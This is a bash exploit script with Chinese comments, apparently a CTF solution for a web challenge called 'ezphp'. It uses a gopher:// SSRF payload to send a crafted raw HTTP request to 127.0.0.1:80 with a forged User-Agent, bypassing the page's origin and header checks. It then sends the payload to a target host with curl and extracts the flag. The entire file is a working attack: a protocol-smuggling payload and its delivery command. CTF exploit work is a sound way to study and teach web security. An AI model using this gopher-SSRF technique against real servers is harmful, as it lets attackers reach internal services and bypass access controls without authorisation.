#!/usr/bin/env bash
# 强网杯 2026 Web - ezphp
# 思路: /flag.php 的 SSRF 协议黑名单漏了 gopher
#       gopher 可以把任意原始字节发给 127.0.0.1:80，从而自定义 User-Agent，
#       满足 flag.php "来源必须 127.0.0.1 + UA 以 qwb2026 开头 + 无代理头" 的三重校验。
# 用法: ./exp.sh https://eci-xxxxxxxx.cloudeci1.ichunqiu.com[:443]

set -u
T="${1:-https://eci-2zefx0aeksdknqbbcv9k.cloudeci1.ichunqiu.com}"

# gopher 报文体: GET /flag.php HTTP/1.0 / Host / User-Agent: qwb2026 / 空行
URL='gopher://127.0.0.1:80/_GET%20/flag.php%20HTTP/1.0%0d%0aHost:%20localhost%0d%0aUser-Agent:%20qwb2026%0d%0a%0d%0a'

echo "[*] target: $T"
curl -sk -G "$T/flag.php" --data-urlencode "url=$URL" \
  | sed -n '/<\/pre>/,$p' \
  | sed '1d'
